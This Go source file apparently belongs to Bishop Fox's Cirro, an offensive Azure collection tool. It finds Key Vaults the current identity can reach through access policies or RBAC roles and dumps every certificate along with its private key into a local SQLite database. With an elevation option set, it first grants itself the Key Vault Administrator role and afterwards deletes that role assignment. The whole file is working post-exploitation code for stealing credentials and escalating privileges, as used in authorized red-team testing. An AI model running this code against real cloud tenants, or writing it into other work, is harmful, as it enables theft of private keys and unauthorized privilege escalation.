package collectors

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"slices"
	"strings"
	"time"

	"github.com/Jeffail/gabs/v2"
	"github.com/bishopfox/cirro/collector/credentials"
	"github.com/google/uuid"
	log "github.com/sirupsen/logrus"
	_ "modernc.org/sqlite"
)

func EnrichKeyVaultCertificates(ctx *CollectorContext) error {

	if ctx.VaultCred == nil {
		log.Warn("No Key Vault credentials set. Skipping Key Vault certificate enrichment")
		return nil
	}

	if err := ctx.OutputDB.Exec("CREATE TABLE IF NOT EXISTS vault_certs (thumbprint TEXT PRIMARY KEY, vault_id TEXT, certdata BLOB, keydata TEXT)"); err != nil {
		return err
	}

	// Get the count of Key Vault resources
	var count int
	if err := ctx.OutputDB.QueryRow("SELECT COUNT(*) FROM resources WHERE lower(resource_type) = 'microsoft.keyvault/vaults'").Scan(&count); err != nil {
		return err
	}
	// If there are no Key Vault resources, return
	if count == 0 {
		log.Info("No Key Vault resources found")
		return nil
	}

	// Get the Key Vault resources from the database
	rows, err := ctx.OutputDB.Query("SELECT id, json(data) FROM resources WHERE lower(resource_type) = 'microsoft.keyvault/vaults' LIMIT 1")
	if err != nil {
		return err
	}
	defer rows.Close()

	// Get an access token for the Key Vault
	var token *credentials.Token
	var tokenOid string

	if token, err = ctx.VaultCred.GetToken(); err != nil {
		return err
	}

	log.Info("Attempting to dump Key Vault certificates and their private keys")

	tokenOid, err = token.GetClaim("oid")
	if err != nil {
		return err
	}

	// Iterate over the rows
	for rows.Next() {
		var id string
		var data []byte

		if err := rows.Scan(&id, &data); err != nil {
			log.Errorf("Error scanning Key Vault resource from database: %v", err)
			continue
		}
		vaultJson, err := gabs.ParseJSON(data)
		if err != nil {
			log.Errorf("Error parsing Key Vault resource JSON: %v", err)
			continue
		}

		// Check if the Key Vault has RBAC enabled
		var rbacEnabled bool
		var rbacRequiresElevation bool

		if vaultJson.Path("properties.enableRbacAuthorization").Data() != nil {
			rbacEnabled = vaultJson.Path("properties.enableRbacAuthorization").Data().(bool)
		}

		// Set a flag to determine if the current user can access the Key Vault
		hasCertAccess := false
		hasSecretAccess := false
		hasDirectRbacAccess := false
		hasEffectiveRbacAccess := false

		// vaultUri := vaultJson.Path("properties.vaultUri").Data().(string)
		// We'll start with checking access policies since it doesn't require further API calls
		if hasCertAccess, hasSecretAccess, err = checkVaultAccessPolicies(vaultJson, tokenOid); err != nil {
			log.Warnf("\tError checking access policies : %v", err)
			continue
		}

		// If the current user has access to the Key Vault via access policies, proceed with dumping certificates
		if hasCertAccess && hasSecretAccess {
			log.Info("\tAccess to Key Vault via access policies confirmed")
			continue
		}

		// If the current user does not have access to the Key Vault via access policies, and RBAC is enabled, check if the current user has direct or effective permissions on the Key Vault
		if rbacEnabled {
			// Check if the current user has a direct RBAC role assignment on the Key Vault
			if hasDirectRbacAccess, rbacRequiresElevation, err = checkVaultDirectRbac(ctx, id, tokenOid); err != nil {
				log.Warnf("\tError checking RBAC permissions: %v", err)
				continue
			}
			log.Infof("\t\tDirect RBAC : %v", hasDirectRbacAccess)
			log.Infof("\t\tDirect RBAC requires elevation : %v", rbacRequiresElevation)

			if !hasDirectRbacAccess {
				// Check if the current user has an RBAC role assignment on the Key Vault
				if hasEffectiveRbacAccess, rbacRequiresElevation, err = checkVaultEffectiveRbac(ctx, id); err != nil {
					log.Warnf("\tError checking RBAC permissions: %v", err)
					continue
				}
				log.Infof("\t\tEffective RBAC access : %v", hasEffectiveRbacAccess)
			}

			if (hasDirectRbacAccess || hasEffectiveRbacAccess) && !rbacRequiresElevation {
				log.Info("\tRBAC access confirmed")
			} else if (hasDirectRbacAccess || hasEffectiveRbacAccess) && rbacRequiresElevation {
				log.Info("\tRBAC access confirmed but requires elevation")
			} else {
				log.Info("\tNo direct or effective RBAC access found")
				continue
			}
		}

		// If we have access to the Key Vault, dump the certificates
		if (hasCertAccess && hasSecretAccess) || (hasDirectRbacAccess || hasEffectiveRbacAccess) {
			dumpVaultCertificates(ctx, vaultJson, rbacRequiresElevation)
		}

	}
	return nil
}

func dumpVaultCertificates(ctx *CollectorContext, vault *gabs.Container, requiresElevation bool) {

	var err error
	var roleAssignmentName string

	vaultId := vault.Path("id").Data().(string)
	vaultUri := vault.Path("properties.vaultUri").Data().(string)

	if requiresElevation && !ctx.ContextOptions.KeyvaultElevate {
		log.Warn("\tKey Vault requires elevation to dump certificates. Use --kv-elevate to elevate permissions")
		return
	}

	// Get the Key Vault certificates
	if requiresElevation {
		roleAssignmentName = uuid.New().String()
		if err = vaultRoleModify(ctx, vaultId, roleAssignmentName, true); err != nil {
			log.Warnf("\tError elevating permissions: %v", err)
			return
		}
		log.Infof("\tElevated permissions for %s", vaultId)
		log.Infof("\tRole assignment ID: %s", roleAssignmentName)
	}

	// Get the Key Vault certificates
	log.Info("\tAdding a 5 second delay to allow permissions to propagate...")
	time.Sleep(5 * time.Second)

	log.Infof("\tDumping certificates for %s", vaultId)

	// Get the Key Vault certificates
	certificateList, err := QueryResources(ctx.VaultCred, vaultUri, "certificates?api-version=7.5", nil)
	if err != nil {
		log.Warnf("\tError getting certificates: %v", err)
		return
	}

	// Iterate over the certificates
	for _, cert := range certificateList {
		// Get the certificate object
		certId := cert["id"].(string)

		log.Infof("\tGetting certificate from %s", certId)
		certData, err := QueryResources(ctx.VaultCred, certId, "?api-version=7.5", nil)
		if err != nil {
			log.Warnf("\tError getting certificate data: %v", err)
			continue
		}
		// Get the private key as a secret
		secretId := certData[0]["sid"]
		log.Infof("\tGetting private key from %s", secretId)
		secretData, err := QueryResources(ctx.VaultCred, secretId.(string), "?api-version=7.5", nil)
		if err != nil {
			log.Warnf("\tError getting secret data: %v", err)
			continue
		}

		// Get the certificate thumbprint
		// This will be used as the primary key in the database
		certx5t := certData[0]["x5t"].(string)
		certx5tDecoded, err := base64.RawURLEncoding.DecodeString(certx5t)
		if err != nil {
			log.Warnf("\tError decoding certificate thumbprint: %v", err)
			continue
		}
		certThumbprint := strings.ToUpper(hex.EncodeToString(certx5tDecoded))

		// Insert the certificate data into the database
		certJson, err := json.Marshal(certData[0])
		if err != nil {
			log.Warnf("\tError marshalling certificate data: %v", err)
			continue
		}
		secretJson, err := json.Marshal(secretData[0])
		if err != nil {
			log.Warnf("\tError marshalling secret data: %v", err)
			continue
		}

		if err := ctx.OutputDB.Exec("REPLACE INTO vault_certs (thumbprint, vault_id, certdata, keydata) VALUES (?, ?, jsonb(?), jsonb(?))", certThumbprint, vaultId, certJson, secretJson); err != nil {
			log.Warnf("\tError inserting certificate data into db: %v", err)
			continue
		}
		log.Infof("\tDumped certificate data - %s", certId)
	}

	// Remove the permissions for the Key Vault
	if requiresElevation {
		if err = vaultRoleModify(ctx, vaultId, roleAssignmentName, false); err != nil {
			log.Warnf("\tError removing elevated permissions: %v", err)

		} else {
			log.Infof("\tRemoved elevated permissions for %s", vaultId)
			log.Infof("\tRole assignment ID: %s", roleAssignmentName)
		}
	}
	log.Infof("\tFinished vault cert enrichment for %s", vaultId)
}

func vaultRoleModify(ctx *CollectorContext, vaultId string, roleAssignmentName string, addRole bool) error {
	// Get the Key Vault id
	log.Infof("\tElevating permissions for %s", vaultId)

	// Get ARM token
	token, err := ctx.ARMCred.GetToken()
	if err != nil {
		return err
	}
	tokenOid, err := token.GetClaim("oid")
	if err != nil {
		return err
	}

	var request *http.Request
	requestUrl := fmt.Sprintf("%s%s/providers/Microsoft.Authorization/roleAssignments/%s?api-version=2022-04-01", ctx.CloudEndpoints.ArmUrl, vaultId, roleAssignmentName)

	if addRole {
		// <ake a request to ARM to create a role assignment
		kvAdminRoleId := "00482a5a-887f-4fb3-b363-3b7fe8e74483"
		roleAssignmentBody := fmt.Sprintf(`{
			"properties": {
				"roleDefinitionId": "%s/providers/Microsoft.Authorization/roleDefinitions/%s",
				"principalId": "%s"
			}
		}`, vaultId, kvAdminRoleId, tokenOid)

		// Make a request to ARM to create a role assignment
		request, err = http.NewRequest(http.MethodPut, requestUrl, strings.NewReader(roleAssignmentBody))
		if err != nil {
			return err
		}

	} else {
		// Make a request to ARM to delete a role assignment
		request, err = http.NewRequest(http.MethodDelete, requestUrl, nil)
		if err != nil {
			return err
		}
	}

	request.Header.Set("Authorization", "Bearer "+token.AccessToken)
	request.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(request)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	// Check if the role assignment was created successfully
	// 409 Conflict is returned if the role assignment already exists
	// This will be considered a success but shouldn't happen in normal circumstances
	successCodes := []int{200, 201, 204, 409}
	if !slices.Contains(successCodes, resp.StatusCode) {
		return fmt.Errorf("HTTP status code: %d - %s", resp.StatusCode, string(respBody))
	}
	if addRole {
		log.Info("\tRole assignment created")
	} else {
		log.Info("\tRole assignment deleted")
	}

	return nil
}

func checkVaultAccessPolicies(vault *gabs.Container, oid string) (bool, bool, error) {
	var hasCertAccess bool
	var hasSecretAccess bool

	// Get the Key Vault name
	vaultUri := vault.Path("properties.vaultUri").Data().(string)
	log.Info(vaultUri)

	// Get the access policies for the Key Vault
	access_policies := vault.Path("properties.accessPolicies").Children()
	if len(access_policies) == 0 {
		log.Info("\tNo access policies found")
		return hasCertAccess, hasSecretAccess, nil
	} else {
		log.Info("\tFound access policies")
	}

	// Check if the current user has access to the Key Vault
	for _, policy := range access_policies {
		// Check if the policy has an objectId field
		if policy.Path("objectId").Data() != nil {
			// Check if the objectId field matches the current user's objectId
			if policy.Path("objectId").Data().(string) == oid {

				// Check if the policy has "Get" and "List" permissions in certificate permissions
				// Permissions for certificate and secrets are stored in their respective arrays
				cert_perms := policy.Path("permissions.certificates").Data().([]string)

				if len(cert_perms) == 0 {
					log.Info("\tNo certificate permissions found")
					return hasCertAccess, hasSecretAccess, nil
				} else {
					if slices.Contains(cert_perms, "Get") && slices.Contains(cert_perms, "List") {
						log.Info("\tFound Get/List permissions for certificates")
						hasCertAccess = true
					} else {
						log.Info("\tNo Get/List permissions found for certificates in Key Vault")
						return hasCertAccess, hasSecretAccess, nil
					}
				}

				// Check if the policy has "Get" permission in secret permissions
				secret_perms := policy.Path("permissions.secrets").Data().([]string)
				if len(secret_perms) == 0 {
					log.Warnf("No secret permissions found for Key Vault %s", vaultUri)
					continue
				} else {
					if slices.Contains(secret_perms, "Get") {
						log.Infof("\tFound Get permissions for secrets in Key Vault")
						hasSecretAccess = true
					} else {
						log.Infof("\tNo Get permission found for secrets in Key Vault")
						continue
					}
				}
			}
		}
	}
	return hasCertAccess, hasSecretAccess, nil
}

func checkVaultDirectRbac(ctx *CollectorContext, resourceId string, oid string) (bool, bool, error) {
	var hasDirectRbac bool
	var rbacRequiresElevation bool

	// Get the Key Vault id
	log.Infof("\tChecking direct RBAC assignments for %s", resourceId)

	// Get the role assignments where the roleName is either Owner or has the following roles:
	// 	Key Vault Administrator
	// 	Key Vault Data Access Administrator (May require escalation)
	// 	Key Vault Certificate User
	// 	Key Vault Certificates Officer
	// If the current user has a role assignment with one of the above roles, set hasRbacAccess to true and return the role assignment name
	kvRoleAssignments, err := getKvRoleAssignmentsFromDb(ctx)
	if err != nil {
		return hasDirectRbac, false, err
	}

	if len(kvRoleAssignments) == 0 {
		log.Info("\tNo role assignments found")
		return hasDirectRbac, false, nil
	}

	var directRoles []string
	for _, roleAssignment := range kvRoleAssignments {
		if roleAssignment["principalId"] == oid {
			log.Infof("\t\tFound direct RBAC assignment: %s", roleAssignment["roleName"])
			directRoles = append(directRoles, roleAssignment["roleName"].(string))
		}
	}

	if len(directRoles) == 0 {
		return hasDirectRbac, false, nil
	}

	// Owner and Key Vault Data Access Administrator require elevation and granting additional permissions
	// If either or both are present, set rbacRequiresElevation to true
	// Otherwise, the other roles do not require elevation
	slices.Sort(directRoles)
	if slices.Equal(directRoles, []string{"Key Vault Data Access Administrator", "Owner"}) {
		hasDirectRbac = true
		rbacRequiresElevation = true
	} else if slices.Equal(directRoles, []string{"Key Vault Data Access Administrator"}) {
		hasDirectRbac = true
		rbacRequiresElevation = true
	} else if slices.Equal(directRoles, []string{"Owner"}) {
		hasDirectRbac = true
		rbacRequiresElevation = true
	} else {
		hasDirectRbac = true
		rbacRequiresElevation = false
	}
	return hasDirectRbac, rbacRequiresElevation, nil
}

func checkVaultEffectiveRbac(ctx *CollectorContext, resourceId string) (bool, bool, error) {
	var hasRbacAccess bool
	var hasElevationAccess bool

	// Get the Key Vault id
	log.Infof("\tChecking effective RBAC permissions for %s", resourceId)

	// Get the effective permissions for the Key Vault
	// If the current user has the following DataActions, they can dump certificates:
	// 	Microsoft.KeyVault/vaults/*
	// 	Microsoft.KeyVault/vaults/certificates/*
	// 	Microsoft.KeyVault/vaults/certificates/read
	// If the current user has the following DataActions, they can get secrets:
	// 	Microsoft.KeyVault/vaults/*
	// 	Microsoft.KeyVault/vaults/secrets/*
	// 	Microsoft.KeyVault/vaults/secrets/getSecret/action

	// Make a request to ARM to get the effective permissions for the Key Vault
	// If the current user has the required permissions, set hasRbacAccess to true
	// If the current user does not have the required permissions, set hasRbacAccess to false
	// If an error occurs, return the error

	validCertPermissions := []string{"Microsoft.KeyVault/vaults/*", "Microsoft.KeyVault/vaults/certificates/*", "Microsoft.KeyVault/vaults/certificates/read"}
	validSecretPermissions := []string{"Microsoft.KeyVault/vaults/*", "Microsoft.KeyVault/vaults/secrets/*", "Microsoft.KeyVault/vaults/secrets/getSecret/action"}
	validNeedsElevation := []string{"*", "Microsoft.Authorization/roleAssignments/write"}

	uri := fmt.Sprintf("%s/providers/Microsoft.Authorization/permissions?api-version=2022-04-01", resourceId)
	response, err := QueryResources(ctx.ARMCred, ctx.CloudEndpoints.ArmUrl, strings.TrimPrefix(uri, "/"), nil)

	if err != nil && response == nil || len(response) == 0 {
		log.Warnf("\tCould not get effective permissions: %v", err)
		return hasRbacAccess, hasElevationAccess, err
	}

	// Check if the current user has the required permissions in DataActions
	// Response is a Convert the response to a gabs container
	actionMap := response[0]
	actions := actionMap["actions"]
	dataActions := actionMap["dataActions"]

	var hasValidCertDataAction bool
	var hasValidSecretDataAction bool

	if dataActions != nil {
		dataActionsStr := make([]string, len(dataActions.([]interface{})))
		for i, v := range dataActions.([]interface{}) {
			dataActionsStr[i] = v.(string)
		}
		if ContainsAny(dataActionsStr, validCertPermissions) {
			log.Info("\t\tFound valid effective permissions for certificates")
			hasValidCertDataAction = true
		}
		if ContainsAny(dataActionsStr, validSecretPermissions) {
			log.Info("\t\tFound valid effective permissions for secrets")
			hasValidSecretDataAction = true
		}
		if hasValidCertDataAction && hasValidSecretDataAction {
			hasRbacAccess = true
		}
	}

	// If we still don't have the required permissions, check if the current user has the required permissions in Actions
	// Check if the current user has the required permissions in Actions
	if actions != nil && !hasRbacAccess {
		actionsStr := make([]string, len(actions.([]interface{})))
		for i, v := range actions.([]interface{}) {
			actionsStr[i] = v.(string)
		}
		if ContainsAny(actionsStr, validNeedsElevation) {
			log.Info("\t\tFound valid effective permissions for elevation")
			hasRbacAccess = true
			hasElevationAccess = true
		}
	}

	return hasRbacAccess, hasElevationAccess, nil
}

func getKvRoleAssignmentsFromDb(ctx *CollectorContext) ([]map[string]interface{}, error) {
	var kvRoleAssignments []map[string]interface{}

	roleRows, err := ctx.OutputDB.Query(`
		SELECT id, json_extract(data, '$.roleName') AS roleName, 
			json_extract(data, '$.properties.scope') AS scope,
			json_extract(data, '$.properties.principalId') AS principalId
		From roleAssignments
		WHERE roleName COLLATE NOCASE IN ('Owner', 'Key Vault Administrator', 'Key Vault Data Access Administrator', 'Key Vault Certificate User', 'Key Vault Certificates Officer')
	`)
	if err != nil {
		return kvRoleAssignments, err
	}
	defer roleRows.Close()

	for roleRows.Next() {
		var id string
		var roleName string
		var scope string
		var principalId string

		if err := roleRows.Scan(&id, &roleName, &scope, &principalId); err != nil {
			log.Errorf("Error scanning role assignment from database: %v", err)
			continue
		}

		roleAssignment := map[string]interface{}{
			"id":          id,
			"roleName":    roleName,
			"scope":       scope,
			"principalId": principalId,
		}
		kvRoleAssignments = append(kvRoleAssignments, roleAssignment)
	}
	return kvRoleAssignments, nil
}
